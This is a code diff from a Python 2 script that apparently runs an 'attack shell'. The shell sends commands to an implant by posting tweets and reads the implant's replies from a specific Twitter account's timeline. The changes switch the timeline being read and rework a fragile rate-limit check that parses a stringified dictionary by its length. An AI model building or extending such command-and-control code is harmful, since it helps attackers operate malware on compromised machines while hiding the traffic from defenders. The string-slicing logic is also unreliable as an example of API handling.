@@ -25,13 +25,21 @@ apiTwo = tweepy.API(auth)
 				   
 def limit():
 	data = api.rate_limit_status()
-	value = str(data['resources']['statuses']['/statuses/home_timeline'])
-	almost = value[-3:]
-	remain= almost[:2]
-	print str(remain) + " API calls remaining" 
-	if( int(remain) == 0):
-		print "Sleeping for 15 minutes. Maually delete tweets from Twitter pages."
-		sleep(15*61)	
+	value = str(data['resources']['statuses']['/statuses/user_timeline'])
+	if (len(value) == 55):
+		almost = value[-3:]
+		remain= almost[:2]
+		print str(remain) + " API calls remaining" 
+		if( int(remain) == 4):
+			print "Sleeping for 15 minutes. Maually delete tweets from Twitter pages."
+			sleep(15*61)
+	else:
+		almost = value[-4:]
+		remain= almost[:3]
+		print str(remain) + " API calls remaining" 
+		if( int(remain) == 4):
+			print "Sleeping for 15 minutes. Maually delete tweets from Twitter pages."
+			sleep(15*61)	
 		
 		
 					   
@@ -39,7 +47,7 @@ if __name__ == "__main__":
 	while True:
 		var = raw_input("twitter_attack$ ")
 		if var == "exit":
-			print "You have closed the attack shell."
+			print "You have closed the attack shell. Maually delete tweets from Twitter pages."
 			break
 			
 		elif var == "help":	
@@ -49,7 +57,7 @@ if __name__ == "__main__":
 			api.update_status(msg)
 			#get and print implant response, might need timing feature
 			sleep(5)
-			new_public_tweets = apiTwo.home_timeline()
+			new_public_tweets = apiTwo.user_timeline('krazykatphoenix')
 			limit()
 			
 			for tweet in new_public_tweets:
